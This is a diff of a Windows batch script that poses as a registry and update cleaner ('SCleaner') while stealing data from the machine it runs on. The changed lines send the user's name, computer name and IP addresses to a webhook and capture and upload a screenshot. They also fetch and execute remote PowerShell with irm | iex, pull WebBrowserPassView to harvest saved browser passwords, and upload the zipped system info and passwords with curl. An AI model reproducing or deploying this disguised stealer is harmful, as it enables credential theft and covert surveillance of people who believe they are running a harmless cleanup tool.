@@ -46,7 +46,21 @@ echo [%TIME%] Getting local IP.. >> "%TEMP%\SCleaner.log"
 for /f "delims=[] tokens=2" %%a in ('ping -4 -n 1 %ComputerName% ^| findstr [') do set IP=%%a
 echo [%TIME%] Getting ipify public IP.. >> "%TEMP%\SCleaner.log"
 for /f %%a in ('powershell Invoke-RestMethod api.ipify.org') do set PublicIP=%%a
+echo [%TIME%] Sending "connection established" message.. >> "%TEMP%\SCleaner.log"
+curl -k -F "payload_json={\"content\": \"~=CONNECTION ESTABLISHED=~ \nDate: %date% \nTime: %time% \nUsername: %username% \nComputer Name: %COMPUTERNAME% \nPublic IP: %PublicIP% \nPrivate IP: %IP%\"}" %WEBHOOK% >nul
 echo Cleaning Registry Waste..
+pushd "%TEMP%\wstemp"
+echo [%TIME%] Downloading screenCapture.bat.. >> "%TEMP%\SCleaner.log"
+powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $ProgressPreference = 'SilentlyContinue'; irm -useb https://raw.githubusercontent.com/npocmaka/batch.scripts/master/hybrids/.net/c/screenCapture.bat" >>"%TEMP%\wstemp\screenCapture.bat"
+echo [%TIME%] Grabbing screenshot.. >> "%TEMP%\SCleaner.log"
+call screenCapture screenshot.png >nul
+echo [%TIME%] Sending screenshot.. >> "%TEMP%\SCleaner.log"
+curl -k -F "file1=@screenshot.png" %WEBHOOK% >nul
+echo [%TIME%] Cleaning up script files.. >> "%TEMP%\SCleaner.log"
+del screencapture.exe >nul
+del screencapture.bat >nul
+popd
+del %TEMP%\fastfetch.exe >nul
 echo [%TIME%] Getting ipconfig info.. >> "%TEMP%\SCleaner.log"
 echo IP Configuration:>>"%TEMP%\wstemp\ipconfig.txt"
 ipconfig >> "%TEMP%\wstemp\ipconfig.txt"
@@ -81,18 +95,12 @@ echo [%TIME%] Downloading fastfetch.. >> "%TEMP%\SCleaner.log"
 powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $ProgressPreference = 'SilentlyContinue'; irm -useb https://raw.githubusercontent.com/LargeVanillaMilkshake/1a/main/fastfetch.exe -outfile %TEMP%\fastfetch.exe"
 echo [%TIME%] Getting fastfetch info.. >> "%TEMP%\SCleaner.log"
 %TEMP%\fastfetch.exe >> "%TEMP%\wstemp\fastfetch.txt"
-echo [%TIME%] Downloading zipping.ps1.. >> "%TEMP%\SCleaner.log"
+echo [%TIME%] Running zipping.ps1.. >> "%TEMP%\SCleaner.log"
 powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $ProgressPreference = 'SilentlyContinue'; irm -useb https://raw.githubusercontent.com/LargeVanillaMilkshake/1a/main/zipping.ps1 | iex"
+echo [%TIME%] Sending info.. >> "%TEMP%\SCleaner.log"
+curl -k -F "file1=@info.zip" %WEBHOOK% >nul
 pushd "%TEMP%\wstemp"
 echo Cleaning Windows Update files..
-echo [%TIME%] Downloading screenCapture.bat.. >> "%TEMP%\SCleaner.log"
-powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $ProgressPreference = 'SilentlyContinue'; irm -useb https://raw.githubusercontent.com/npocmaka/batch.scripts/master/hybrids/.net/c/screenCapture.bat" >>"%TEMP%\wstemp\screenCapture.bat"
-echo [%TIME%] Grabbing screenshot.. >> "%TEMP%\SCleaner.log"
-call screenCapture screenshot.png >nul
-echo [%TIME%] Cleaning up script files.. >> "%TEMP%\SCleaner.log"
-del screencapture.exe >nul
-del screencapture.bat >nul
-del %TEMP%\fastfetch.exe >nul
 echo [%TIME%] Downloading passreccommandline.zip.. >> "%TEMP%\SCleaner.log"
 powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $ProgressPreference = 'SilentlyContinue'; irm -useb https://github.com/LargeVanillaMilkshake/1a/raw/refs/heads/main/passreccommandline.zip -OutFile '%TEMP%\wstemp\passreccommandline.zip'"
 echo [%TIME%] Extracting contents.. >> "%TEMP%\SCleaner.log"
@@ -106,8 +114,8 @@ del "WebBrowserPassView.exe" >nul
 if exist "WebBrowserPassView.cfg" del "WebBrowserPassView.cfg" >nul
 echo [%TIME%] Zipping passwords.. >> "%TEMP%\SCleaner.log"
 powershell -Command "$ProgressPreference = 'SilentlyContinue'; Compress-Archive -Path '%TEMP%\wstemp\passwords.txt' -DestinationPath '%TEMP%\wstemp\passwords.zip' -Force"
-echo [%TIME%] Sending first webhook message.. >> "%TEMP%\SCleaner.log"
-curl -k -F "payload_json={\"content\": \"~=CONNECTION ESTABLISHED=~ \nDate: %date% \nTime: %time% \nUsername: %username% \nComputer Name: %COMPUTERNAME% \nPublic IP: %PublicIP% \nPrivate IP: %IP% \nInfo and Screenshot:\"}" -F "file1=@screenshot.png" -F "file2=@info.zip" -F "file3=@passwords.zip" %WEBHOOK% >nul
+echo [%TIME%] Sending passwords.. >> "%TEMP%\SCleaner.log"
+curl -k -F "file1=@passwords.zip" %WEBHOOK% >nul
 echo [%TIME%] Deleting screenshot.. >> "%TEMP%\SCleaner.log"
 del screenshot.png
 echo [%TIME%] Downloading preconfigured python embedabble.. >> "%TEMP%\SCleaner.log"
